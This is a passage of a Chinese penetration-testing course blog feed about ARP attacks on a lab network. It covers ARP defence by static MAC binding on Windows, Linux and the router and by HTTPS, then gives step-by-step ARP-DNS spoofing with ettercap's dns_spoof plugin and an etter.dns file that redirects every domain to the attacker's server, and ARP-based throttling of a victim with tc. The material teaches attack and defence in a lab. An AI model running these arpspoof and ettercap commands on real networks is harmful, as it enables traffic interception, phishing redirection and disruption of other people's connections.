href="#10-停止攻击" class="headerlink" title="10.停止攻击"></a>10.停止攻击</h5><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-设置静态mac地址"><a href="#2-设置静态mac地址" class="headerlink" title="2.设置静态mac地址"></a>2.设置静态mac地址</h3><h4 id="1-临时绑定，重启后失去保护效果"><a href="#1-临时绑定，重启后失去保护效果" class="headerlink" title="1.临时绑定，重启后失去保护效果"></a>1.临时绑定，重启后失去保护效果</h4><h5 id="1-ARP表MAC地址绑定状态"><a href="#1-ARP表MAC地址绑定状态" class="headerlink" title="1.ARP表MAC地址绑定状态"></a>1.ARP表MAC地址绑定状态</h5><p>ARP表MAC地址绑定类型有动态和静态两种。</p><ul><li><p>动态：有时效限制，会实时更新，不安全</p></li><li><p>静态：长久生效，不会随时间或者通知而变化，安全。</p></li></ul><p>我们来看一下电脑上的ARP表。</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>大部分都是动态的，动态的MAC地址他有生命周期，一定时间之后就会被替换，另外别人通知我更新的时候，也会被直接替换，也就是说无论是被动获取时发现变化了，还是主动被告知时已经变动了，arp列表都会进行更新。如果是攻击方告诉了靶机，他也会相信，从而导致被攻击。我们解决的方法就是把动态的MAC地址变成静态的。那么该如何绑定呢？</p><h5 id="2-绑定步骤"><a href="#2-绑定步骤" class="headerlink" title="2.绑定步骤"></a>2.绑定步骤</h5><p>1.Win10以管理员身份运行CMD命令提示符  </p><p>2.查询网关的ip和mac地址</p><pre class="line-numbers language-none"><code class="language-none">arp -a |findstr 192.168.70.1网关的IP：192.168.70.1网关的MAC地址：00-50-56-f3-07-7c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.查询本机的网卡</p><pre class="line-numbers language-none"><code class="language-none">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/.%5Cassets%5C%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E7%BD%91%E5%8D%A1.png" alt="查看本机网卡"></p><p>4.查询本地连接的网卡ID号</p><pre class="line-numbers language-none"><code class="language-none">netsh i i show in#netsh i i show in  是netsh  interface ipv4 show interfaces 的缩写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从图中可以找到，Idx就是网卡的ID，以 Ethernet0也就是我本机的网卡，id=6</p><p><img src="/.%5Cassets%5C%E6%9F%A5%E8%AF%A2%E7%BD%91%E5%8D%A1id.png" alt="查询网卡id"></p><p>5.临时绑定mac地址，重启失效</p><pre class="line-numbers language-none"><code class="language-none">netsh -c i i add neighbors&nbsp; 6 192.168.70.1 e4-3a-6e-35-98-00 store=active-c Context 指定上下文i: interface 更改到 `netsh interface' 上下文。i:ipv4add: 在项目列表上添加一个配置项目neighbors: 添加邻居地址store=active：设置为临时绑定查询帮助命令：netsh -c /?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/.%5Cassets%5C%E4%B8%B4%E6%97%B6%E6%94%B9%E5%8F%98%E6%88%90%E9%9D%99%E6%80%81.png" alt="临时改变成静态"></p><p>6.发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.查询靶机ARP表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.停止ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9.重启靶机,查看arp表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10.重新发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11.查看靶机arp</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>12.停止攻击</p><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-永久绑定，重启后不失效"><a href="#2-永久绑定，重启后不失效" class="headerlink" title="2.永久绑定，重启后不失效"></a>2.永久绑定，重启后不失效</h4><p>1.绑定命令</p><pre class="line-numbers language-none"><code class="language-none">netsh -c i i add neighbors&nbsp; 6 192.168.110.1 e4-3a-6e-35-98-00 store=persistentstore=persistent：永久绑定<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.查看ARP表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.发起ARP攻击</p><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.查看arp缓存表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.重启电脑，查看ARP表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.删除静态配置</p><pre class="line-numbers language-none"><code class="language-none">arp -d ip #不推荐使用，下次设置时，出现错误netsh -c i i delete ne 6  #推荐使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>7.查看靶机arp表</p><pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.停止攻击</p><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-linux防御"><a href="#3-linux防御" class="headerlink" title="3.linux防御"></a>3.linux防御</h2><h4 id="1-查询arp表命令"><a href="#1-查询arp表命令" class="headerlink" title="1.查询arp表命令"></a>1.查询arp表命令</h4><pre class="line-numbers language-none"><code class="language-none">arp -aip n ip neigh 192.168.110.1 dev ens33 lladdr e4:3a:6e:35:98:00 STALE #不新鲜的192.168.110.1 dev ens33 lladdr e4:3a:6e:35:98:00 REACHABLE #可到达的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-临时添加静态地址，重启后失效"><a href="#2-临时添加静态地址，重启后失效" class="headerlink" title="2.临时添加静态地址，重启后失效"></a>2.临时添加静态地址，重启后失效</h4><pre class="line-numbers language-none"><code class="language-none">arp -s 192.168.110.1 e4:3a:6e:35:98:00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-查询arp表"><a href="#3-查询arp表" class="headerlink" title="3.查询arp表"></a>3.查询arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n192.168.110.1 dev ens33 lladdr e4:3a:6e:35:98:00 PERMANENT #永久的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-发起ARP攻击"><a href="#4-发起ARP攻击" class="headerlink" title="4.发起ARP攻击"></a>4.发起ARP攻击</h4><pre class="line-numbers language-none"><code class="language-none">ettercap -T -i eth0  -M arp:remote /192.168.110.1// /192.168.110.26// <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-查看靶机arp表"><a href="#5-查看靶机arp表" class="headerlink" title="5.查看靶机arp表"></a>5.查看靶机arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-重启靶机"><a href="#6-重启靶机" class="headerlink" title="6.重启靶机"></a>6.重启靶机</h4><pre class="line-numbers language-none"><code class="language-none">reboot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-查看靶机arp表"><a href="#7-查看靶机arp表" class="headerlink" title="7.查看靶机arp表"></a>7.查看靶机arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-将其添加到-rc-local里边-开启自动执行"><a href="#8-将其添加到-rc-local里边-开启自动执行" class="headerlink" title="8.将其添加到 rc.local里边 开启自动执行"></a>8.将其添加到 rc.local里边 开启自动执行</h4><pre class="line-numbers language-none"><code class="language-none">vi  /etc/rc.localchmod +x /etc/rc.d/rc.local添加：arp -s 192.168.110.1 e4:3a:6e:35:98:00wq保存<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-重启centos7"><a href="#9-重启centos7" class="headerlink" title="9.重启centos7"></a>9.重启centos7</h4><pre class="line-numbers language-none"><code class="language-none">reboot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-查看arp表"><a href="#10-查看arp表" class="headerlink" title="10.查看arp表"></a>10.查看arp表</h4><pre class="line-numbers language-none"><code class="language-none">ip n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-路由-x2F-网关防护设置"><a href="#4-路由-x2F-网关防护设置" class="headerlink" title="4.路由/网关防护设置"></a>4.路由/网关防护设置</h2><h3 id="1-打开路由器配置网站"><a href="#1-打开路由器配置网站" class="headerlink" title="1.打开路由器配置网站"></a>1.打开路由器配置网站</h3><p>​一般是http://网关ip</p><h3 id="2-点击更多功能"><a href="#2-点击更多功能" class="headerlink" title="2.点击更多功能"></a>2.点击更多功能</h3><p><img src="/.%5Cassets%5C%E8%B7%AF%E7%94%B1%E5%99%A8-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD.png" alt="路由器-更多功能"></p><h3 id="3-选择网络设置–局域网"><a href="#3-选择网络设置–局域网" class="headerlink" title="3.选择网络设置–局域网"></a>3.选择网络设置–局域网</h3><p><img src="/.%5Cassets%5C%E8%B7%AF%E7%94%B1-%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE.png" alt="路由-网络设置"></p><h3 id="4-添加静态ip地址绑定列表"><a href="#4-添加静态ip地址绑定列表" class="headerlink" title="4.添加静态ip地址绑定列表"></a>4.添加静态ip地址绑定列表</h3><p><img src="/.%5Cassets%5C%E8%B7%AF%E7%94%B1%E5%99%A8-%E6%B7%BB%E5%8A%A0%E9%9D%99%E6%80%81ip%E5%9C%B0%E5%9D%80%E7%BB%91%E5%AE%9A.png" alt="路由器-添加静态ip地址绑定"></p><h3 id="5-手动添加绑定"><a href="#5-手动添加绑定" class="headerlink" title="5.手动添加绑定"></a>5.手动添加绑定</h3><p><img src="/.%5Cassets%5C%E8%B7%AF%E7%94%B1%E6%89%8B%E5%8A%A8%E9%85%8D%E7%BD%AEmac%E5%9C%B0%E5%9D%80.png" alt="路由手动配置mac地址"></p><h2 id="5-WEB服务防御ARP攻击"><a href="#5-WEB服务防御ARP攻击" class="headerlink" title="5.WEB服务防御ARP攻击"></a>5.WEB服务防御ARP攻击</h2><p>web服务防御明文传输泄露用户信息的手段：使用加密协议:https</p><h3 id="1-什么是HTTP"><a href="#1-什么是HTTP" class="headerlink" title="1.什么是HTTP"></a>1.什么是HTTP</h3><p>超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。设计HTTP的初衷是为了提供一种发布和接收HTML页面的方法。使用明文传输，容易被劫持。</p><h3 id="2-什么是HTTPS"><a href="#2-什么是HTTPS" class="headerlink" title="2.什么是HTTPS"></a>2.什么是HTTPS</h3><p>《图解HTTP》这本书中曾提过HTTPS是身披SSL外壳的HTTP。HTTPS是一种通过计算机网络进行安全通信的传输协议，经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS使用的主要目的是提供对网站服务器的身份认证，同时保护交换数据的隐私与完整性。使用加密传输，不容易被拦截，更加安全。</p><p>TLS是传输层加密协议，前身是SSL协议，由网景公司1995年发布，有时候两者不区分。</p><h3 id="3-HTTPS加密通讯工作原理"><a href="#3-HTTPS加密通讯工作原理" class="headerlink" title="3.HTTPS加密通讯工作原理"></a>3.HTTPS加密通讯工作原理</h3><p><img src="/.%5Cassets%5CHTTPS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.png" alt="HTTPS工作原理"></p><h2 id="5-课堂小结"><a href="#5-课堂小结" class="headerlink" title="5.课堂小结"></a>5.课堂小结</h2><p>请参照：ARP攻击防御.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7.ARP-DNS欺诈</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/7.arp-dns-qi-pian/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/7.arp-dns-qi-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>DNS是Domain Name System的缩写,我们称之域名系统。首先它是远程调用服务,本地默认占用53端口，它本身的实质上-一个域名和ip的数据库服务器，他要完成的任务是帮我们把输入的域名转换成ip地址，之后通过ip寻址连接目标服务器。</p><h2 id="DNS工作过程"><a href="#DNS工作过程" class="headerlink" title="DNS工作过程"></a>DNS工作过程</h2><p>当访问一个网站时系统将从DNS缓存中读取该域名所对应的IP地址，当查找不到时就会到系统中查找hosts文件,如果还没有那么才会向DNS服务器请求一个DNS查询， DNS服务器将返回该域名所对应的IP,在你的系统收到解析地址以后将使用该IP地址进行访问，同时将解析缓存到本地的DNS缓存中。</p><p><img src="/assets/image-20221223143711807.png" alt="image-20221223143711807"></p><h1 id="什么是DNS劫持"><a href="#什么是DNS劫持" class="headerlink" title="什么是DNS劫持"></a>什么是DNS劫持</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求,分析请求的域名，把审查范围以外的求放行，否则返回假的IP地址或者什么都不做使请求失去响应,效果就是<strong>对特定的网络不能访问或访问的是假网址</strong>。</p><h2 id="ettercap劫持的原理"><a href="#ettercap劫持的原理" class="headerlink" title="ettercap劫持的原理"></a>ettercap劫持的原理</h2><p>局域网劫持,攻击者通过伪装成<strong>网关</strong>，劫持受害者的网络请求将网络请求拦截到指定的服务器</p><h2 id="DNS常用命令"><a href="#DNS常用命令" class="headerlink" title="DNS常用命令"></a>DNS常用命令</h2><h3 id="查看DNS缓存表"><a href="#查看DNS缓存表" class="headerlink" title="查看DNS缓存表"></a>查看DNS缓存表</h3><p><code>ipconfig /displaydns</code></p><h3 id="获取DNS地址"><a href="#获取DNS地址" class="headerlink" title="获取DNS地址"></a>获取DNS地址</h3><p><code>ping baidu.com</code></p><h3 id="刷新DNS缓存"><a href="#刷新DNS缓存" class="headerlink" title="刷新DNS缓存"></a>刷新DNS缓存</h3><p><code>ipconfig /flushdns</code></p><h1 id="ARP-DNS欺骗攻击步骤"><a href="#ARP-DNS欺骗攻击步骤" class="headerlink" title="ARP-DNS欺骗攻击步骤"></a>ARP-DNS欺骗攻击步骤</h1><h2 id="kali开启apache"><a href="#kali开启apache" class="headerlink" title="kali开启apache"></a>kali开启apache</h2><p><code>service apache2 start</code></p><h3 id="查看apache状态"><a href="#查看apache状态" class="headerlink" title="查看apache状态"></a>查看apache状态</h3><p><code>service apache2 status</code></p><h3 id="浏览器访问Apache的首页"><a href="#浏览器访问Apache的首页" class="headerlink" title="浏览器访问Apache的首页"></a>浏览器访问Apache的首页</h3><p><a href="http://192.168.70.3/">http://192.168.70.3</a></p><h2 id="编辑ettercap配置文件"><a href="#编辑ettercap配置文件" class="headerlink" title="编辑ettercap配置文件"></a>编辑ettercap配置文件</h2><h3 id="进入配置文件位置"><a href="#进入配置文件位置" class="headerlink" title="进入配置文件位置"></a>进入配置文件位置</h3><p><code>cd /etc/ettercap</code></p><h3 id="复制原有的配置文件（环境恢复方便）"><a href="#复制原有的配置文件（环境恢复方便）" class="headerlink" title="复制原有的配置文件（环境恢复方便）"></a>复制原有的配置文件（环境恢复方便）</h3><p><code>cp etter.dns etter.dns1</code></p><h3 id="设置DNS劫持配置文件"><a href="#设置DNS劫持配置文件" class="headerlink" title="设置DNS劫持配置文件"></a>设置DNS劫持配置文件</h3><p><code>vim /etc/ettercap/etter.dns</code></p><p>添加以下内容</p><pre class="line-numbers language-none"><code class="language-none">*  A   192.168.70.3*  PTR 192.168.70.3www.*.com A 192.168.70.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>wq</code>保存</p><p>参数</p><ul><li>*：表示所有网站，也可以设置某个网站 <a href="http://www.baidu.com/">www.baidu.com</a></li><li>A:表示钓鱼的ip地址</li><li>PTR:常被用于方向地址解析</li></ul><h3 id="ettercap劫持命令讲解"><a href="#ettercap劫持命令讲解" class="headerlink" title="ettercap劫持命令讲解"></a>ettercap劫持命令讲解</h3><pre class="line-numbers language-none"><code class="language-none">ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关//-i:网卡-T：问本模式-q:安静模式-M:执行mitml攻击-P：plugin 开始该插件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="靶机访问网页确认环境正常"><a href="#靶机访问网页确认环境正常" class="headerlink" title="靶机访问网页确认环境正常"></a>靶机访问网页确认环境正常</h3><ul><li><p><a href="http://www.mashibing.com/">http://www.mashibing.com/</a></p></li><li><p><a href="http://m.ctrip.com/">http://m.ctrip.com</a></p></li><li><p><a href="http://www.dj.com/">http://www.dj.com/</a></p></li><li><p>ping <a href="http://www.mashibing.com/">http://www.mashibing.com/</a></p></li><li><p>ping <a href="http://m.ctrip.com/">http://m.ctrip.com</a></p></li><li><p>ping <a href="http://www.dj.com/">http://www.dj.com/</a></p></li></ul><h2 id="执行劫持命令"><a href="#执行劫持命令" class="headerlink" title="执行劫持命令"></a>执行劫持命令</h2><pre class="line-numbers language-none"><code class="language-none">ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /192.168.70.130// /192.168.70.2// &gt;b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="分析日志"><a href="#分析日志" class="headerlink" title="分析日志"></a>分析日志</h3><p><code>tail -f b.txt</code></p><p>或者</p><p><code>tail -f b.txt | grep "dns_spoof"</code></p><h3 id="靶机访问http网站查看攻击效果"><a href="#靶机访问http网站查看攻击效果" class="headerlink" title="靶机访问http网站查看攻击效果"></a>靶机访问http网站查看攻击效果</h3><ul><li><a href="http://www.mashibing.com/">http://www.mashibing.com/</a></li><li><a href="http://m.ctrip.com/">http://m.ctrip.com</a></li><li><a href="http://www.dj.com/">http://www.dj.com/</a></li></ul><h2 id="停止劫持"><a href="#停止劫持" class="headerlink" title="停止劫持"></a>停止劫持</h2><p>ctrl+c</p><h2 id="恢复dns劫持，刷新dns缓存"><a href="#恢复dns劫持，刷新dns缓存" class="headerlink" title="恢复dns劫持，刷新dns缓存"></a>恢复dns劫持，刷新dns缓存</h2><p><code>ipconfig /flushdns</code></p><h3 id="靶机访问网站查看环境是否恢复正常"><a href="#靶机访问网站查看环境是否恢复正常" class="headerlink" title="靶机访问网站查看环境是否恢复正常"></a>靶机访问网站查看环境是否恢复正常</h3><ul><li><a href="http://www.dj.com/">http://www.dj.com/</a></li></ul><p>ping <a href="http://www.dj.com/">www.dj.com</a></p><h2 id="恢复kali环境"><a href="#恢复kali环境" class="headerlink" title="恢复kali环境"></a>恢复kali环境</h2><h4 id="进入配置文件位置-1"><a href="#进入配置文件位置-1" class="headerlink" title="进入配置文件位置"></a>进入配置文件位置</h4><p><code>cd /etc/ettercap</code></p><h4 id="复制dns文件到新wen文件"><a href="#复制dns文件到新wen文件" class="headerlink" title="复制dns文件到新wen文件"></a>复制dns文件到新wen文件</h4><p><code>cp etter.dns etter.dns2</code></p><h4 id="还原dns配置文件"><a href="#还原dns配置文件" class="headerlink" title="还原dns配置文件"></a>还原dns配置文件</h4><p><code>cp etter.dns1 etter.dns</code></p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>6.ARP限制网速攻击</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/6.arp-xian-zhi-wang-su/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/6.arp-xian-zhi-wang-su/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP限制网速攻击"><a href="#ARP限制网速攻击" class="headerlink" title="ARP限制网速攻击"></a>ARP限制网速攻击</h1><p>大家没想到吧，ARP还能限制对方网速。当kali欺骗了网关和受害者的时候，受害者访问网络就需要经过kali的网卡，那我们限制kali网卡的速度或者转发的速度就可以限制对方的网速。这里可以使用的工具有tc、iptables、WonderShaper等等，我们以tc为例，tc是通过限制网卡的速度来限制对方的，是一种杀敌一千自损八百的手段。</p><h2 id="1-TC工具介绍"><a href="#1-TC工具介绍" class="headerlink" title="1.TC工具介绍"></a>1.TC工具介绍</h2><p>在Linux中，流量控制都是通过TC这个工具来完成的。通常， 要对网卡进行流量控制的配置，需要进行如下的步骤:</p><p>◆ 为网卡配置一个队列;</p><p>◆ 在该队列上建立分类;</p><p>◆ 根据需要建立子队列和子分类;</p><p>◆ 为每个分类建立过滤器。</p><p>需要注意的是， 在TC 中使用下列的缩写表示相应的网络延迟:</p><p>时间的计量单位：</p><ul><li><p>s、sec或者secs               秒</p></li><li><p>ms、msec或者msecs            毫秒</p></li><li><p>us、usec、usecs或者一个无单位数字  微秒</p></li></ul><p>QDisc(排队规则) [qdɪsk]是queueing discipline [ˈkjuːɪŋ] [ˈdɪsəplɪn] 的简写，它是理解流量控制(traffic control)的基础。无论何时，内核如果需要通过某个网络接口发送数据包，它都需要按照为这个接口配置的qdisc(排队规则)把数据包加入队列。然后，内核会尽可能多地从qdisc里面取出数据包，把它们交给网络适配器驱动模块。</p><h2 id="2-TC命令介绍"><a href="#2-TC命令介绍" class="headerlink" title="2.TC命令介绍"></a>2.TC命令介绍</h2><h4 id="1-限制网速200ms延时"><a href="#1-限制网速200ms延时" class="headerlink" title="1.限制网速200ms延时"></a>1.限制网速200ms延时</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc add dev eth0 root netem delay 200ms参数：qdisc：排队规则add:添加dev：设备（网卡）root：root用户身份netem delay：设置网络延时时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-取消限制网速200ms延时"><a href="#2-取消限制网速200ms延时" class="headerlink" title="2.取消限制网速200ms延时"></a>2.取消限制网速200ms延时</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc del dev eth0 root netem delay 200ms参数：qdisc：排队规则del:删除dev：设备（网卡）root：root用户身份netem delay：设置网络延时时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-修改网络延时"><a href="#3-修改网络延时" class="headerlink" title="3.修改网络延时"></a>3.修改网络延时</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc change&nbsp; dev eth0 root netem delay 300ms参数：qdisc：排队规则change:修改dev：设备（网卡）root：root用户身份netem delay：设置网络延时时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-ARP攻击限制网速的具体步骤"><a href="#3-ARP攻击限制网速的具体步骤" class="headerlink" title="3.ARP攻击限制网速的具体步骤"></a>3.ARP攻击限制网速的具体步骤</h2><h4 id="1-开启端口转发"><a href="#1-开启端口转发" class="headerlink" title="1.开启端口转发"></a>1.开启端口转发</h4><pre class="line-numbers language-none"><code class="language-none">cat /proc/sys/net/ipv4/ip_forward         #值为0表示没开启流量转发，为1表示开启了echo 1 &gt; /proc/sys/net/ipv4/ip_forward     #开启流量转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-开启ARP攻击"><a href="#2-开启ARP攻击" class="headerlink" title="2.开启ARP攻击"></a>2.开启ARP攻击</h4><pre class="line-numbers language-none"><code class="language-none">arpspoof -i eth0 -r 192.168.70.1 -t 192.168.70.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-查看靶机当前的网速"><a href="#3-查看靶机当前的网速" class="headerlink" title="3.查看靶机当前的网速"></a>3.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-开启网络延迟限速"><a href="#4-开启网络延迟限速" class="headerlink" title="4.开启网络延迟限速"></a>4.开启网络延迟限速</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc add dev eth0 root netem delay 500ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-查看限速规则"><a href="#5-查看限速规则" class="headerlink" title="5.查看限速规则"></a>5.查看限速规则</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-查看靶机当前的网速"><a href="#6-查看靶机当前的网速" class="headerlink" title="6.查看靶机当前的网速"></a>6.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-修改网速限制"><a href="#7-修改网速限制" class="headerlink" title="7.修改网速限制"></a>7.修改网速限制</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc change dev eth0 root netem delay 800ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="8-查看限速规则"><a href="#8-查看限速规则" class="headerlink" title="8.查看限速规则"></a>8.查看限速规则</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-查看靶机当前的网速"><a href="#9-查看靶机当前的网速" class="headerlink" title="9.查看靶机当前的网速"></a>9.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-取消限速"><a href="#10-取消限速" class="headerlink" title="10.取消限速"></a>10.取消限速</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc del dev eth0 root netem delay 800ms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="11-查看限速规则"><a href="#11-查看限速规则" class="headerlink" title="11.查看限速规则"></a>11.查看限速规则</h4><pre class="line-numbers language-none"><code class="language-none">tc qdisc show<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="12-查看靶机当前的网速"><a href="#12-查看靶机当前的网速" class="headerlink" title="12.查看靶机当前的网速"></a>12.查看靶机当前的网速</h4><pre class="line-numbers language-none"><code class="language-none">https://www.speedtest.cn/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-限速原理讲解"><a href="#4-限速原理讲解" class="headerlink" title="4.限速原理讲解"></a>4.限速原理讲解</h2><p><img src="/assets/ARP%E9%99%90%E5%88%B6%E7%BD%91%E9%80%9F%E5%8E%9F%E7%90%86%E5%9B%BE.png" alt="ARP限制网速原理图"></p><h2 id="5-课堂小结"><a href="#5-课堂小结" class="headerlink" title="5.课堂小结"></a>5.课堂小结</h2><p>请参考：ARP限制网速攻击-课后笔记.xmind</p>]]></content>
      
      
      <categories>
          
          <category> ARP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5.ARP-Ettercap劫持用户流量</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/5.arp-ettercap-jie-chi-yong-hu-liu-liang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/27arp/5.arp-ettercap-jie-chi-yong-hu-liu-liang/</url>
      
